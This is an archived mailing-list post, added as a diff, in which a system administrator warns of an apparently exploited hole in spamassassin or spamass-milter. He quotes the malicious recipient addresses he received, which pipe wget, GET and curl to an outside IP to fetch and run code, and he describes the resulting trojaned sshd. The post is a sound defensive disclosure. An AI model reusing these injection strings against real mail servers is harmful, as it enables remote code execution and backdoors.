@@ -1,0 +1,117 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
+<HTML>
+ <HEAD>
+   <TITLE> [users] spamassassin or spamass-milter exploit
+   </TITLE>
+   <LINK REL="Index" HREF="index.html" >
+   <LINK REL="made" HREF="mailto:users%40lists.repoforge.org?Subject=Re:%20Re%3A%20%5Busers%5D%20spamassassin%20or%20spamass-milter%20exploit&In-Reply-To=%3Calpine.OSX.2.00.1003161059190.1237%40guild.galois.com%3E">
+   <META NAME="robots" CONTENT="index,nofollow">
+   <META http-equiv="Content-Type" content="text/html; charset=us-ascii">
+   <LINK REL="Previous"  HREF="024273.html">
+   <LINK REL="Next"  HREF="027628.html">
+ </HEAD>
+ <BODY BGCOLOR="#ffffff">
+   <H1>[users] spamassassin or spamass-milter exploit</H1>
+    <B>Paul Heinlein</B> 
+    <A HREF="mailto:users%40lists.repoforge.org?Subject=Re:%20Re%3A%20%5Busers%5D%20spamassassin%20or%20spamass-milter%20exploit&In-Reply-To=%3Calpine.OSX.2.00.1003161059190.1237%40guild.galois.com%3E"
+       TITLE="[users] spamassassin or spamass-milter exploit">heinlein at madboa.com
+       </A><BR>
+    <I>Tue Mar 16 20:08:17 CET 2010</I>
+    <P><UL>
+        <LI>Previous message: <A HREF="024273.html">[suggest] Re: suggest Digest, Vol 57, Issue 6
+</A></li>
+        <LI>Next message: <A HREF="027628.html">[users] spamassassin or spamass-milter exploit
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#27627">[ date ]</a>
+              <a href="thread.html#27627">[ thread ]</a>
+              <a href="subject.html#27627">[ subject ]</a>
+              <a href="author.html#27627">[ author ]</a>
+         </LI>
+       </UL>
+    <HR>  
+<!--beginarticle-->
+<PRE>This is a heads-up that there might be an actively exploited 
+vulnerability in either the spamassassin or spamass-milter package. 
+I'm still unsure where the problem lies, but here's what I know.
+
+The system described below runs x86_64 release of CentOS 5.4. SELinux 
+was, at the time, in Permissive mode. The packages involved, as far as 
+I can tell, are
+
+  * spamassassin-3.2.5-1.el5.rf
+  * spamass-milter-0.3.1-1.el5.rf
+  * sendmail-8.13.8-2.el5 (not rpmforge, obviously)
+
+Mar 15 05:47 (times are PDT): Several messages arrived with suspicious 
+recipients:
+
+  &lt;root+:&gt;
+  &lt;root+:&quot;|wget <A HREF="http://61.100.185.177/busy-1.php">http://61.100.185.177/busy-1.php</A>&quot;&gt;
+  &lt;root+:&quot;|GET <A HREF="http://61.100.185.177/busy-2.php">http://61.100.185.177/busy-2.php</A>&quot;&gt;
+  &lt;root+:&quot;|curl <A HREF="http://61.100.185.177/busy-3.php">http://61.100.185.177/busy-3.php</A>&quot;&gt;
+
+Sendmail recognized the addresses as syntactically evil, but a process 
+running under the spamass_milter_t context ran wget, GET, and curl and 
+connected to the IP address in the addresses above.
+
+The file(s) downloaded by these processes executed a shell script. It 
+did several things, the highlights of which are
+
+  1. It downloaded, uncompressed, and untar-ed a file named
+     xS.tar.gz. The resulting directory name was /xS.
+
+  2. It tried to add a unix group and user named &quot;sshd&quot;; the attempt
+     failed, probably because there's already an sshd user and group
+     on the system.
+
+  3. It installed 32-bit Linux executables in place of /usr/bin/ssh
+     and /usr/sbin/sshd. The new executables were dynamically linked
+     against a small number of libraries, but most of the supporting
+     libraries had been compiled directly into the applications.
+
+  4. It installed a minimal /etc/ssh/sshd_config and an empty
+     /etc/ssh/ssh_config.
+
+  5. After verifying that sshd was in the process table, it
+     removed the /xS directory.
+
+  6. It created an empty file name /dev/devno
+
+  7. It restarted sshd using /sbin/service
+
+Again, this was all done under the spamass_milter_t security context.
+
+I don't know enough about the sendmail &lt;-&gt; spamass-milter &lt;-&gt; spamd 
+pipeline to have a definitive idea about what application misparsed 
+the piped e-mail addresses and executed them.
+
+I saw the attack again this morning, but by then I'd cleaned things up 
+and gotten SELinux back into Enforcing mode, which prevented the 
+exploit from working again.
+
+-- 
+Paul Heinlein &lt;&gt; <A HREF="http://lists.repoforge.org/mailman/listinfo/users">heinlein at madboa.com</A> &lt;&gt; <A HREF="http://www.madboa.com/">http://www.madboa.com/</A>
+
+</PRE>
+
+<!--endarticle-->
+    <HR>
+    <P><UL>
+        <!--threads-->
+	<LI>Previous message: <A HREF="024273.html">[suggest] Re: suggest Digest, Vol 57, Issue 6
+</A></li>
+	<LI>Next message: <A HREF="027628.html">[users] spamassassin or spamass-milter exploit
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#27627">[ date ]</a>
+              <a href="thread.html#27627">[ thread ]</a>
+              <a href="subject.html#27627">[ subject ]</a>
+              <a href="author.html#27627">[ author ]</a>
+         </LI>
+       </UL>
+
+<hr>
+<a href="http://lists.repoforge.org/mailman/listinfo/users">More information about the users
+mailing list</a><br>
+</body></html>
